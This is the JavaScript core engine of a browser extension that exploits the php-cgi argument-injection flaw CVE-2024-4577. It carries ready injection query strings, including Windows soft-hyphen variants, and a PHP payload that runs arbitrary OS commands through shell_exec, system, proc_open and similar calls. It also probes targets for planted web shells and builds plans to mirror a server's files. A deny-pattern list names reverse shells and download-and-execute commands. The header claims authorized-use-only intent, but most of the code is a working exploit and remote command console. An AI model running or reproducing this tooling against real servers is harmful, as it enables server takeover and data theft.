/* =============================================================================
 *  PHP2Shell Extension — core engine
 * =============================================================================
 *
 *  ⚠️  AUTHORIZED USE ONLY — READ BEFORE USE
 *  -----------------------------------------------------------------------------
 *  This tool actively sends PHP code-execution payloads to the target host and
 *  can run operating-system commands on it. It is intended EXCLUSIVELY for:
 *
 *      • authorized security auditing / penetration testing,
 *      • bug-bounty engagements that explicitly scope the target host,
 *      • lab / CTF / self-hosted practice environments,
 *      • educational study of CVE-2024-4577 style argument injection.
 *
 *  It is NOT for use against third-party systems you do not own or have written
 *  permission to test. You are responsible for complying with the law in your
 *  jurisdiction (e.g. CFAA, Computer Misuse Act,刑法 equivalents) and with the
 *  rules of engagement of the engagement you are running.
 *
 *  The engine itself is deliberately PURE: no chrome.* / browser.* APIs, no DOM
 *  access, no side effects. All network access goes through an injectable
 *  `fetchImpl` so the exact same code paths can be unit-tested under Node.
 *
 *  Every request this module produces is confined to ONE origin (the target
 *  that the user explicitly scanned). There is no telemetry, no update check,
 *  and no contact with any third party.
 * =============================================================================
 */

(function (root, factory) {
  'use strict';
  var engine = factory();
  /* Node (tests) */
  if (typeof module === 'object' && module.exports) module.exports = engine;
  /* Browser (service worker / page) */
  if (root) root.P2SEngine = engine;
})(typeof globalThis !== 'undefined' ? globalThis : self, function () {
  'use strict';

  var ENGINE_VERSION = '1.0.0';

  /* ---------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------ */

  /** Marker prefix used for every payload so responses are unambiguous. */
  var MARKER_PREFIX = 'P2S_MARK_';

  /** Start/end delimiters wrapped around command output for clean extraction. */
  var OUT_START = 'P2S_OUT_START_';
  var OUT_END = 'P2S_OUT_END_';

  /**
   * Query-string parameter names commonly used by pre-existing web shells.
   * Ranked by how strongly they imply a command-execution endpoint.
   */
  var SHELL_PARAMS = [
    { name: 'cmd', weight: 90, label: 'cmd' },
    { name: 'exec', weight: 88, label: 'exec' },
    { name: 'command', weight: 86, label: 'command' },
    { name: 'shell', weight: 85, label: 'shell' },
    { name: 'system', weight: 80, label: 'system' },
    { name: 'c', weight: 70, label: 'c' },
    { name: 'sh', weight: 60, label: 'sh' },
    { name: 'do', weight: 55, label: 'do' },
    { name: 'run', weight: 45, label: 'run' },
    { name: 'eval', weight: 45, label: 'eval' },
    { name: 'q', weight: 25, label: 'q' }
  ];

  /** Filenames that are well-known web shells. */
  var KNOWN_SHELL_FILES = [
    'c99.php', 'r57.php', 'b374k.php', 'alfa.php', 'c0den.php', 'wso.php',
    'shell.php', 'webshell.php', 'cmd.php', 'hack.php', 'backdoor.php',
    'phpinfo.php', 'php.php', 'inde.php', 'x.php', 's.php'
  ];

  /**
   * PHP-CGI argument-injection vectors.
   *
   * The "php-cgi" SAPI builds its own argv from the request line, so on some
   * deployments the query string is turned into CLI arguments. That lets an
   * attacker inject `-d` (define ini) switches:
   *
   *     allow_url_include=1          → allow_url_include
   *     auto_prepend_file=php://input → the raw request body is included as PHP
   *
   * The body is then executed as PHP code before the real script runs — i.e.
   * arbitrary PHP execution (CVE-2024-4577 family).
   *
   * `softHyphen: true` variants use U+00AD (0xAD) instead of a plain "-": the
   * byte survives the transport layer but is stripped by PHP's own argument
   * parser, which is the Windows/IIS flavour of the same bug.
   */
  var INJECTION_VECTORS = [
    {
      id: 'cgi-d-unix',
      name: 'php-cgi argument injection (Unix flavour)',
      query: '-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',
      decodesTo: '-d allow_url_include=1 -d auto_prepend_file=php://input',
      method: 'POST',
      confidence: 95
    },
    {
      id: 'cgi-d-unix-pct',
      name: 'php-cgi argument injection (fully percent-encoded)',
      query: '-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input',
      decodesTo: '-d allow_url_include=1 -d auto_prepend_file=php://input',
      method: 'POST',
      confidence: 90
    },
    {
      id: 'cgi-ad-windows',
      name: 'php-cgi argument injection (Windows soft-hyphen flavour)',
      query: '%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3Dphp://input',
      decodesTo: '\u00ADd allow_url_include=1 \u00ADd auto_prepend_file=php://input',
      method: 'POST',
      confidence: 92
    },
    {
      id: 'cgi-ad-windows-pct',
      name: 'php-cgi argument injection (Windows, percent-encoded soft-hyphen)',
      query: '%ADd%20allow_url_include%3d1%20%ADd%20auto_prepend_file%3Dphp://input',
      decodesTo: '\u00ADd allow_url_include=1 \u00ADd auto_prepend_file=php://input',
      method: 'POST',
      confidence: 88
    }
  ];

  /**
   * Commands that are destructive enough that the UI must ask for an explicit
   * second confirmation before they are sent to the target.
   */
  var DANGEROUS_PATTERNS = [
    { re: /\brm\s+(-[a-zA-Z]*\s+)*-?[rf]/i, why: 'recursive / forced delete' },
    { re: /\brm\s+-rf?\s+\/(?!\/)/i, why: 'delete at filesystem root' },
    { re: /\bmkfs(\.[a-z0-9]+)?\b/i, why: 'filesystem format' },
    { re: /\bdd\s+.*\bof=\/dev\//i, why: 'raw write to a block device' },
    { re: /\b(shutdown|reboot|halt|poweroff)\b/i, why: 'host power state change' },
    { re: /\bchown\b|\bchmod\b.*777/i, why: 'permission change' },
    { re: /\bkill(all)?\s+-9/i, why: 'kill all processes' },
    { re: /\b(wget|curl)\b.*\|\s*(ba)?sh/i, why: 'download-and-execute' },
    { re: /\b(del)\s+.*\/[sf]?(?:\/\*)?/i, why: 'bulk delete' },
    { re: /\bhistory\s+-c\b/i, why: 'shell history wipe' },
    { re: /\buseradd\b|\buserdel\b|\busermod\b/i, why: 'account modification' },
    { re: /\biptables\b|\bufw\b|\bsystemctl\b.*\b(stop|disable)\b/i, why: 'service/ACL manipulation' },
    { re: /\btruncate\b|\bshred\b/i, why: 'data destruction' },
    { re: /\bnc\b.*\s-[el]\b|\bbash\s+-i\b>/i, why: 'reverse shell' }
  ];

  /* ---------------------------------------------------------------------------
   * Small helpers
   * ------------------------------------------------------------------------ */

  function randomToken(len) {
    var bytes = new Uint8Array(len || 12);
    var crypto = (typeof globalThis !== 'undefined') ? globalThis.crypto : null;
    if (crypto && crypto.getRandomValues) {
      crypto.getRandomValues(bytes);
    } else {
      for (var i = 0; i < bytes.length; i++) bytes[i] = Math.floor(Math.random() * 256);
    }
    var out = '';
    for (var j = 0; j < bytes.length; j++) {
      out += ('0' + bytes[j].toString(16)).slice(-2);
    }
    return out;
  }

  function b64encode(str) {
    var b64 = (typeof globalThis !== 'undefined' && globalThis.btoa)
      ? globalThis.btoa
      : (typeof Buffer !== 'undefined' ? function (s) { return Buffer.from(s, 'binary').toString('base64'); } : null);
    if (!b64) throw new Error('no base64 encoder available');
    /* btoa() only handles latin1; encode UTF-8 first. */
    var utf8 = unescape(encodeURIComponent(str));
    return b64(utf8);
  }

  function b64decode(str) {
    var b64 = (typeof globalThis !== 'undefined' && globalThis.atob)
      ? globalThis.atob
      : (typeof Buffer !== 'undefined' ? function (s) { return Buffer.from(s, 'base64').toString('binary'); } : null);
    if (!b64) throw new Error('no base64 decoder available');
    var binary = b64(str);
    /* atob() returns a latin1 string — turn it back into UTF-8 text. */
    try {
      return decodeURIComponent(escape(binary));
    } catch (e) {
      return binary;
    }
  }

  function escapeRegExp(s) {
    return String(s).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  /** Truncate for display without cutting mid-multibyte char. */
  function truncate(s, n) {
    s = String(s == null ? '' : s);
    if (s.length <= n) return s;
    return s.slice(0, Math.max(0, n - 1)) + '…';
  }

  /* ---------------------------------------------------------------------------
   * Directory listing → download plan
   *
   * The console can run `ls -la` on the target. These helpers turn that
   * listing into a set of concrete, same-origin download URLs so the whole
   * exposed directory can be mirrored locally.
   * ------------------------------------------------------------------------ */

  /* mode(10) links owner group size month day stamp name */
  var LS_LINE_RE = /^(\S{10})\s+(\d+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s?(.*)$/;

  /**
   * Parse a single `ls -la` line.
   * Returns null when the line is not a directory entry.
   */
  function parseLsLine(line) {
    var m = LS_LINE_RE.exec(String(line == null ? '' : line));
    if (!m) return null;

    var perms = m[1];
    var type = perms.charAt(0);
    var name = m[9] || '';
    var linkTarget = null;

    if (type === 'l') {
      var arrow = name.indexOf(' -> ');
      if (arrow !== -1) {
        linkTarget = name.slice(arrow + 4);
        name = name.slice(0, arrow);
      }
    }

    return {
      perms: perms,
      type: type,                    /* d f l b c p s */
      isDir: type === 'd',
      isLink: type === 'l',
      links: parseInt(m[2], 10),
      owner: m[3],
      group: m[4],
      size: parseInt(m[5], 10),
      month: m[6],
      day: m[7],
      stamp: m[8],
      name: name,
      linkTarget: linkTarget
    };
  }

  /**
   * Parse the output of `ls -la` (or `ls -laR`, where each block is prefixed
   * with a "directory:" header) into structured entries.
   */
  function parseLsOutput(text) {
    var entries = [];
    var currentDir = '';
    var lines = String(text == null ? '' : text).split(/\r?\n/);

    for (var i = 0; i < lines.length; i++) {
      var line = lines[i];
      if (!line || !line.trim()) continue;

      var entry = parseLsLine(line);
      if (entry) {
        entry.dir = currentDir;
        entries.push(entry);
        continue;
      }

      /* "ls -laR" prints a "<dir>:" header before every block. */
      var header = /^(.+):\s*$/.exec(line);
      if (header) currentDir = header[1].trim();
    }
    return entries;
  }

  /**
   * Split the combined listing output into the environment header and the
   * actual `ls` output.
   */
  function parseListingOutput(text) {
    var meta = { docroot: '', script: '', cwd: '' };
    var body = [];
    var lines = String(text == null ? '' : text).split(/\r?\n/);

    for (var i = 0; i < lines.length; i++) {
      var m = /^__P2S_(DOCROOT|SCRIPT|PWD)=(.*)$/.exec(lines[i]);
      if (m) {
        if (m[1] === 'DOCROOT') meta.docroot = m[2].trim();
        else if (m[1] === 'SCRIPT') meta.script = m[2].trim();
        else meta.cwd = m[2].trim();
        continue;
      }
      body.push(lines[i]);
    }

    return { meta: meta, entries: parseLsOutput(body.join('\n')) };
  }

  /** Quote a value for safe use as a single shell word. */
  function shellQuote(value) {
    return "'" + String(value == null ? '' : value).replace(/'/g, "'\\''") + "'";
  }

  /**
   * Build the shell command that lists a directory and reports the server
   * environment (document root, script name, working directory) in one go.
   */
  function buildListingCommand(opts) {
    opts = opts || {};
    var dir = String(opts.dir || '').trim() || '.';
    var ls = opts.recursive ? 'ls -laR' : 'ls -la';
    return 'cd ' + shellQuote(dir) + ' 2>/dev/null; ' +
           'printf \'__P2S_DOCROOT=%s\\n__P2S_SCRIPT=%s\\n__P2S_PWD=%s\\n\' ' +
           '"$DOCUMENT_ROOT" "$SCRIPT_NAME" "$PWD"; ' +
           ls;
  }

  /** Percent-encode a URL path, keeping the separators. */
  function encodeUrlPath(p) {
    return String(p == null ? '' : p)
      .split('/')
      .map(function (seg) { return encodeURIComponent(seg); })
      .join('/');
  }

  /** Make a relative, traversal-free path usable as a download filename. */
  function sanitizeRelativePath(p) {
    return String(p == null ? '' : p)
      .replace(/\\/g, '/')
      .split('/')
      .filter(function (seg) { return seg && seg !== '.' && seg !== '..'; })
      .map(function (seg) { return seg.replace(/[\x00-\x1f\/:*?"<>|]/g, '_'); })
      .join('/');
  }

  /**
   * Turn parsed directory entries into a download plan: same-origin URLs plus
   * a safe local filename for each of them.
   *
   * ctx = { origin, docroot, cwd, scriptName, entries, rootName }
   */
  function buildDownloadPlan(ctx) {
    ctx = ctx || {};
    var origin = String(ctx.origin || '').replace(/\/+$/, '');
    var docroot = String(ctx.docroot || '').replace(/\/+$/, '');
    var cwd = String(ctx.cwd || '').replace(/\/+$/, '');
    var scriptName = String(ctx.scriptName || '');
    var rootName = sanitizeRelativePath(ctx.rootName || 'p2s-download') || 'p2s-download';

    var files = [];
    var skipped = [];

    (ctx.entries || []).forEach(function (e) {
      if (!e || !e.name || e.name === '.' || e.name === '..') return;

      if (e.isDir) {
        skipped.push({ name: e.name, reason: 'directory' });
        return;
      }
      if (e.isLink) {
        skipped.push({ name: e.name, reason: 'symlink' });
        return;
      }

      /* Absolute filesystem path of the entry. */
      var dir = String(e.dir || '').trim();
      var fsPath;
      if (!dir) {
        fsPath = cwd ? cwd + '/' + e.name : e.name;
      } else if (dir.charAt(0) === '/') {
        fsPath = dir + '/' + e.name;
      } else {
        /* relative directory, as printed by `ls -laR` ("./sub") */
        var rel = dir.replace(/^\.\//, '');
        fsPath = rel ? (cwd ? cwd + '/' : '') + rel + '/' + e.name
                     : (cwd ? cwd + '/' + e.name : e.name);
      }

      /* Map the filesystem path back onto a URL path. */
      var urlPath = null;
      if (docroot) {
        if (fsPath === docroot) urlPath = '/';
        else if (fsPath.indexOf(docroot + '/') === 0) urlPath = '/' + fsPath.slice(docroot.length + 1);
      }
      if (urlPath === null) {
        /* No usable document root: fall back to the directory of the script. */
        if (scriptName) {
          var base = scriptName.replace(/[^/]*$/, '');
          if (base.indexOf('http') === 0) {
            try { base = new URL(scriptName).pathname.replace(/[^/]*$/, ''); } catch (e) { base = '/'; }
          }
          urlPath = base + e.name;
        }
      }
      if (urlPath === null) {
        skipped.push({ name: e.name, reason: 'outside document root' });
        return;
      }

      files.push({
        name: e.name,
        path: urlPath,
        url: origin + encodeUrlPath(urlPath),
        filename: rootName + '/' + (sanitizeRelativePath(urlPath) || e.name),
        size: e.size,
        perms: e.perms
      });
    });

    return { files: files, skipped: skipped };
  }

  /* ---------------------------------------------------------------------------
   * Target parsing & static (offline) analysis
   * ------------------------------------------------------------------------ */

  /**
   * Parse a URL into the pieces the scanner cares about.
   * Never throws — returns null for unusable input.
   */
  function parseTarget(rawUrl) {
    var u;
    try {
      u = new URL(rawUrl);
    } catch (e) {
      return null;
    }
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;

    var params = [];
    u.searchParams.forEach(function (value, name) {
      params.push({ name: name, value: value });
    });

    var path = u.pathname || '/';
    if (path.length > 1 && path.charAt(path.length - 1) === '/') path = path.replace(/\/+$/, '/');

    return {
      url: u.href,
      origin: u.origin,
      protocol: u.protocol.replace(':', ''),
      host: u.hostname,
      port: u.port || (u.protocol === 'https:' ? '443' : '80'),
      path: path,
      search: u.search || '',
      params: params,
      /** Path without the trailing slash, used to build candidate script URLs. */
      stem: path.replace(/\/+$/, '')
    };
  }

  /** Does this path look like a known web-shell filename? */
  function looksLikeShellPath(path) {
    var p = String(path || '').toLowerCase();
    var file = p.substring(p.lastIndexOf('/') + 1);
    return KNOWN_SHELL_FILES.indexOf(file) !== -1;
  }

  /**
   * Analyse query parameters for shell-like semantics.
   * @param {Array} params  [{ name, value }]
   * @param {string} rawUrl  the untouched URL (the raw query string matters for
   *                         the php-cgi injection shapes, because URLSearchParams
   *                         decodes '+' to ' ' and '%3d' to '=').
   * @returns {Array} evidence objects: { type, severity, title, detail }
   */
  function analyzeParams(params, rawUrl) {
    var evidence = [];
    var byName = {};
    params.forEach(function (p) { byName[p.name.toLowerCase()] = p; });
    var raw = String(rawUrl || '');

    SHELL_PARAMS.forEach(function (candidate) {
      var hit = byName[candidate.name];
      if (!hit) return;
      var value = String(hit.value || '');
      var shellish = /(\||;|&&|\$\(|`|\bsh\b|\bbash\b|\bcat\b|\bwhoami\b|\bid\b|\bls\b|\/etc\/|\/bin\/|%2f|%2e)/i.test(value);
      var b64ish = /^[A-Za-z0-9+/]{16,}={0,2}$/.test(value) && /%3d|=+$/.test(value + '');
      var severity = candidate.weight >= 80 ? 'high' : (candidate.weight >= 55 ? 'medium' : 'low');

      evidence.push({
        type: 'url',
        severity: severity,
        title: 'Shell-like query parameter: ?' + hit.name + '=',
        detail: 'Parameter "' + hit.name + '" matches a common web-shell command channel' +
          (shellish ? ' and its value looks like shell syntax.' : '.'),
        value: truncate(value, 160)
      });

      if (shellish) {
        evidence.push({
          type: 'url',
          severity: 'high',
          title: 'Shell syntax inside ?' + hit.name,
          detail: 'The value of "' + hit.name + '" contains shell metacharacters or command names.',
          value: truncate(value, 160)
        });
      }
      if (b64ish) {
        evidence.push({
          type: 'url',
          severity: 'medium',
          title: 'Base64-looking value in ?' + hit.name,
          detail: 'Obfuscated payloads are commonly base64-encoded command strings.',
          value: truncate(value, 160)
        });
      }
    });

    /* Already-exploited URL shapes. These are checked against the RAW url,
     * because the interesting bytes ('+', '%3d', '%AD') are destroyed by the
     * URLSearchParams decoding. */
    if (/auto_prepend_file/i.test(raw)) {
      evidence.push({
        type: 'url', severity: 'high',
        title: 'auto_prepend_file present in query string',
        detail: 'The request already carries a PHP-CGI include-injection argument.'
      });
    }
    if (/%ADd|%ad(?:\+|%20)|\+?\-d(?:\+|%20)|(^|[?&])\-d\b/i.test(raw)) {
      evidence.push({
        type: 'url', severity: 'high',
        title: 'php-cgi argument injection pattern in URL',
        detail: 'The query string contains a "-d" / "soft-hyphen d" style argument, typical of CVE-2024-4577 probes.'
      });
    }
    if (/php:\/\/(input|temp)/i.test(raw)) {
      evidence.push({
        type: 'url', severity: 'high',
        title: 'php:// stream wrapper in query string',
        detail: 'A php:// wrapper is referenced, indicating a PHP include/execution primitive.'
      });
    }
    if (/allow_url_include/i.test(raw)) {
      evidence.push({
        type: 'url', severity: 'high',
        title: 'allow_url_include present in query string',
        detail: 'allow_url_include is the switch that makes php://include style primitives usable.'
      });
    }
    return evidence;
  }

  /**
   * Full offline analysis of a URL: parameters, path, scheme smells.
   */
  function analyzeUrl(rawUrl) {
    var target = parseTarget(rawUrl);
    if (!target) return null;

    var evidence = analyzeParams(target.params, rawUrl);

    if (looksLikeShellPath(target.path)) {
      evidence.push({
        type: 'url', severity: 'high',
        title: 'Known web-shell filename in path',
        detail: 'The requested path matches a well-known web-shell filename.'
      });
    }
    if (/[?;]/.test(target.stem) && /(cmd|exec|shell)/i.test(target.stem)) {
      evidence.push({
        type: 'url', severity: 'medium',
        title: 'Command-like token inside the path',
        detail: 'The path contains command-like keywords.'
      });
    }
    if (target.protocol === 'http' && /\/admin|\/cgi-bin|\/cgi\//i.test(target.path)) {
      evidence.push({
        type: 'url', severity: 'low',
        title: 'Path resembles a CGI / admin surface',
        detail: 'CGI and admin endpoints are common landing spots for php-cgi deployments.'
      });
    }

    return { target: target, evidence: evidence };
  }

  /* ---------------------------------------------------------------------------
   * Candidate script URLs
   * ------------------------------------------------------------------------ */

  /**
   * Build the list of script paths worth probing for this target.
   * Only PHP entry points can host a php-cgi include-injection.
   */
  function candidateScripts(target) {
    var out = [];
    var seen = {};

    function add(p) {
      if (!p || seen[p]) return;
      seen[p] = true;
      out.push(p);
    }

    var path = target.path || '/';
    if (/\.php$/i.test(path)) {
      add(path);
      add(path.replace(/\/[^/]*$/, '/index.php'));
    } else if (/\/$/.test(path)) {
      add(path + 'index.php');
      add(path);
    } else {
      add(path);
      add(path + '/index.php');
      add('/index.php');
    }
    /* De-duplicated, order preserved. */
    var seen2 = {};
    return out.filter(function (p) {
      if (!p || seen2[p]) return false;
      seen2[p] = true;
      return true;
    });
  }

  /* ---------------------------------------------------------------------------
   * Payloads
   * ------------------------------------------------------------------------ */

  /**
   * Benign probe payload: echoes a unique marker plus the PHP version.
   * It performs NO side effects — it only proves that PHP code is executed.
   */
  function markerPayload(token) {
    var t = token;
    return '<?php echo "' + MARKER_PREFIX + t + '"; echo "|phpver=" . PHP_VERSION . "|sapi=" . php_sapi_name(); ?>';
  }

  /**
   * Command-execution payload.
   *
   * The command is base64-encoded inside the PHP source so no quoting or
   * escaping problems can occur in the transport layer. Output is wrapped in
   * delimiters so the extension can extract it from the surrounding page.
   */
  function commandPayload(b64cmd, token) {
    var cmd = b64cmd;
    var t = token;
    return [
      '<?php',
      '$__p2s_c = base64_decode("' + cmd + '");',
      '$__p2s_out = "";',
      '$__p2s_rc = 0;',
      'if (function_exists("shell_exec")) { $__p2s_out = (string) @shell_exec($__p2s_c); }',
      'elseif (function_exists("system")) { ob_start(); @system($__p2s_c); $__p2s_out = (string) ob_get_clean(); }',
      'elseif (function_exists("passthru")) { ob_start(); @passthru($__p2s_c); $__p2s_out = (string) ob_get_clean(); }',
      'elseif (function_exists("exec")) { $__p2s_l = array(); @exec($__p2s_c, $__p2s_l, $__p2s_rc); $__p2s_out = implode("\\n", $__p2s_l); }',
      'elseif (function_exists("popen")) { $__p2s_h = @popen($__p2s_c, "r"); if ($__p2s_h) { $__p2s_out = (string) stream_get_contents($__p2s_h); pclose($__p2s_h); } }',
      'elseif (function_exists("proc_open")) { $__p2s_d = array(1 => array("pipe", "w"), 2 => array("pipe", "w")); $__p2s_p = @proc_open($__p2s_c, $__p2s_d, $__p2s_pipes); if (is_resource($__p2s_p)) { $__p2s_out = (string) stream_get_contents($__p2s_pipes[1]); fclose($__p2s_pipes[1]); $__p2s_e = (string) stream_get_contents($__p2s_pipes[2]); fclose($__p2s_pipes[2]); proc_close($__p2s_p); if ($__p2s_e !== "") { $__p2s_out .= "\\n" . $__p2s_e; } } }',
      'else { $__p2s_out = (string) @`$__p2s_c`; }',
      'echo "' + OUT_START + t + '";',
      'echo $__p2s_out;',
      'echo "' + OUT_END + t + '";'
    ].join('\n');
  }

  /* ---------------------------------------------------------------------------
   * Output extraction
   * ------------------------------------------------------------------------ */

  /** Extract the text between the two output delimiters. */
  function extractOutput(body, token) {
    var start = OUT_START + token;
    var end = OUT_END + token;
    var i = body.indexOf(start);
    if (i === -1) return null;
    var j = body.indexOf(end, i + start.length);
    if (j === -1) return null;
    return body.slice(i + start.length, j);
  }

  /** Was the probe marker echoed back? */
  function hasMarker(body, token) {
    return String(body || '').indexOf(MARKER_PREFIX + token) !== -1;
  }

  /* ---------------------------------------------------------------------------
   * HTTP layer
   * ------------------------------------------------------------------------ */

  function joinUrl(base, query) {
    var sep = base.indexOf('?') === -1 ? '?' : '&';
    return base + sep + query;
  }

  function withTimeout(promise, ms, label) {
    var ctrl = (typeof AbortController !== 'undefined') ? new AbortController() : null;
    var timer = null;
    var opts = ctrl ? { signal: ctrl.signal } : {};
    var timeout = new Promise(function (_resolve, reject) {
      timer = setTimeout(function () {
        if (ctrl) ctrl.abort();
        reject(new Error('timeout after ' + ms + 'ms (' + (label || 'request') + ')'));
      }, ms);
    });
    return Promise.race([promise, timeout]).finally(function () {
      if (timer) clearTimeout(timer);
    });
  }

  /**
   * Perform one POST probe against a php-cgi candidate.
   *
   * @param {object} opts
   * @param {function} opts.fetchImpl  fetch-like function (defaults to global fetch)
   * @param {string}  opts.url         full URL including the injection query string
   * @param {string}  opts.body        raw request body (the PHP source)
   * @param {number}  opts.timeoutMs
   * @returns {Promise<object>} { ok, status, body, markerFound, error }
   */
  function postProbe(opts) {
    var fetchImpl = opts.fetchImpl || (typeof fetch !== 'undefined' ? fetch : null);
    if (!fetchImpl) return Promise.reject(new Error('no fetch implementation available'));

    var url = opts.url;
    var body = opts.body;
    var timeoutMs = opts.timeoutMs || 8000;

    var ctrl = (typeof AbortController !== 'undefined') ? new AbortController() : null;
    var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, timeoutMs);

    return fetchImpl(url, {
      method: 'POST',
      body: body,
      credentials: 'include',
      redirect: 'follow',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-P2Shell-Extension': ENGINE_VERSION
      },
      signal: ctrl ? ctrl.signal : undefined
    }).then(function (res) {
      return res.text().then(function (text) {
        return {
          ok: res.ok,
          status: res.status,
          headers: res.headers,
          body: text,
          url: url
        };
      });
    }).catch(function (err) {
      return { ok: false, status: 0, body: '', url: url, error: String(err && err.message || err) };
    }).finally(function () {
      clearTimeout(timer);
    });
  }

  /** Perform a GET probe (used for header fingerprinting and pre-existing shells). */
  function getProbe(opts) {
    var fetchImpl = opts.fetchImpl || (typeof fetch !== 'undefined' ? fetch : null);
    if (!fetchImpl) return Promise.reject(new Error('no fetch implementation available'));

    var timeoutMs = opts.timeoutMs || 8000;
    var ctrl = (typeof AbortController !== 'undefined') ? new AbortController() : null;
    var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, timeoutMs);

    return fetchImpl(opts.url, {
      method: 'GET',
      credentials: 'include',
      redirect: 'follow',
      headers: { 'X-P2Shell-Extension': ENGINE_VERSION },
      signal: ctrl ? ctrl.signal : undefined
    }).then(function (res) {
      return res.text().then(function (text) {
        return { ok: res.ok, status: res.status, headers: res.headers, body: text, url: opts.url };
      });
    }).catch(function (err) {
      return { ok: false, status: 0, body: '', url: opts.url, error: String(err && err.message || err) };
    }).finally(function () {
      clearTimeout(timer);
    });
  }

  /** Extract interesting response headers. */
  function interestingHeaders(headers) {
    var out = [];
    if (!headers || typeof headers.forEach !== 'function') return out;
    headers.forEach(function (value, key) {
      var k = String(key).toLowerCase();
      if (k === 'x-powered-by' || k === 'server' || k === 'x-php-version' ||
          k === 'x-aspnet-version' || k === 'content-type' || k === 'x-generator' ||
          k === 'x-drupal-cache' || k === 'via') {
        out.push({ name: String(key), value: String(value) });
      }
    });
    return out;
  }

  /** Header values that scream "this is a PHP host". */
  function phpHeaderEvidence(headers) {
    var evidence = [];
    interestingHeaders(headers).forEach(function (h) {
      var k = h.name.toLowerCase();
      var v = h.value;
      if (k === 'x-powered-by' && /php/i.test(v)) {
        evidence.push({
          type: 'header', severity: 'medium',
          title: 'X-Powered-By: ' + truncate(v, 80),
          detail: 'The server discloses that the page is rendered by PHP. Needed, but not sufficient, for exploitation.'
        });
      }
      if (k === 'server' && /php/i.test(v)) {
        evidence.push({
          type: 'header', severity: 'low',
          title: 'Server: ' + truncate(v, 80),
          detail: 'The server banner mentions PHP.'
        });
      }
    });
    return evidence;
  }

  /* ---------------------------------------------------------------------------
   * Probing strategies
   * ------------------------------------------------------------------------ */

  /**
   * Strategy A — look for a PRE-EXISTING command channel (a planted shell).
   *
   * Sends a harmless `echo <marker>` through candidate parameter names and
   * looks for the marker to come back. This never runs a destructive command.
   *
   * `ctx.scripts` may hold several candidate scripts (the current page plus
   * shell-like links found in the DOM); `ctx.script` is the single-script
   * shorthand.
   */
  function probeExistingShell(ctx) {
    var target = ctx.target;
    var token = ctx.token;
    var scriptList = (ctx.scripts && ctx.scripts.length) ? ctx.scripts.slice(0, 4) : [ctx.script];
    var candidates = [];

    /* Prefer parameters that are actually present in the current URL. */
    target.params.forEach(function (p) {
      var known = SHELL_PARAMS.filter(function (s) { return s.name === p.name.toLowerCase(); })[0];
      if (known) candidates.push({ name: known.name, weight: known.weight, present: true });
    });
    /* Then the common ones not already in the URL. */
    SHELL_PARAMS.forEach(function (s) {
      if (!candidates.some(function (c) { return c.name === s.name; })) {
        candidates.push({ name: s.name, weight: s.weight, present: false });
      }
    });
    candidates.sort(function (a, b) { return b.weight - a.weight; });

    var limit = ctx.maxParams || 8;
    var tried = [];
    var acc0 = { found: false, strategy: 'existing-shell', tried: tried, evidence: [] };

    var combos = [];
    scriptList.forEach(function (script) {
      if (!script) return;
      candidates.slice(0, limit).forEach(function (cand) {
        combos.push({ script: script, cand: cand });
      });
    });

    return combos.reduce(function (prev, combo) {
      return prev.then(function (acc) {
        if (acc.found) return acc;
        var script = combo.script;
        var cand = combo.cand;
        var url = script + '?' + encodeURIComponent(cand.name) + '=' + encodeURIComponent('echo ' + MARKER_PREFIX + token);
        tried.push({ param: cand.name, url: url });
        return getProbe({ fetchImpl: ctx.fetchImpl, url: url, timeoutMs: ctx.timeoutMs }).then(function (res) {
          if (res && res.body && res.body.indexOf(MARKER_PREFIX + token) !== -1) {
            return {
              found: true,
              strategy: 'existing-shell',
              vector: {
                id: 'existing-' + cand.name,
                name: 'Existing command channel via ?' + cand.name + '=',
                method: 'GET',
                param: cand.name,
                script: script,
                confidence: cand.present ? 90 : 75
              },
              tried: tried,
              evidence: [{
                type: 'active', severity: 'high',
                title: 'Command channel confirmed on ?' + cand.name,
                detail: 'The server executed "echo <marker>" received through the "' + cand.name + '" parameter and returned the marker verbatim.'
              }],
              response: res
            };
          }
          return { found: false, strategy: 'existing-shell', tried: tried, evidence: [], response: res };
        });
      });
    }, Promise.resolve(acc0)).then(function (acc) {
      acc.tried = tried;
      return acc;
    });
  }

  /**
   * Strategy B — php-cgi argument injection (CVE-2024-4577 family).
   *
   * POSTs a harmless marker payload to each (script x vector) combination and
   * looks for the marker in the response body.
   */
  function probeInjection(ctx) {
    var token = ctx.token;
    var body = markerPayload(token);
    var scripts = ctx.scripts || [];
    var vectors = ctx.vectors || INJECTION_VECTORS;

    var combos = [];
    scripts.forEach(function (s) {
      vectors.forEach(function (v) {
        combos.push({ script: s, vector: v });
      });
    });

    var tried = [];
    var acc0 = { found: false, strategy: 'cgi-injection', tried: tried, evidence: [] };

    return combos.reduce(function (prev, combo) {
      return prev.then(function (acc) {
        if (acc.found) return acc;
        var url = joinUrl(combo.script, combo.vector.query);
        tried.push({ vector: combo.vector.id, url: url });
        return postProbe({ fetchImpl: ctx.fetchImpl, url: url, body: body, timeoutMs: ctx.timeoutMs })
          .then(function (res) {
            if (res && res.body && res.body.indexOf(MARKER_PREFIX + token) !== -1) {
              var phpVer = '';
              var m = res.body.match(/\|phpver=([^|]*)\|sapi=([^|<\s]*)/);
              if (m) { phpVer = m[1]; var sapi = m[2]; }
              return {
                found: true,
                strategy: 'cgi-injection',
                vector: {
                  id: combo.vector.id,
                  name: combo.vector.name,
                  method: 'POST',
                  query: combo.vector.query,
                  script: combo.script,
                  confidence: combo.vector.confidence,
                  phpVersion: phpVer,
                  sapi: sapi
                },
                tried: tried,
                evidence: [{
                  type: 'active', severity: 'critical',
                  title: 'Arbitrary PHP execution confirmed',
                  detail: 'A PHP payload sent through the query string was executed by the server and echoed back unchanged. This is the php-cgi argument-injection behaviour (CVE-2024-4577 family).'
                }, {
                  type: 'active', severity: 'medium',
                  title: 'Working vector: ' + combo.vector.name,
                  detail: 'Query string: ' + combo.vector.query
                }],
                response: res
              };
            }
            return { found: false, strategy: 'cgi-injection', tried: tried, evidence: [], response: res };
          });
      });
    }, Promise.resolve(acc0)).then(function (acc) {
      acc.tried = tried;
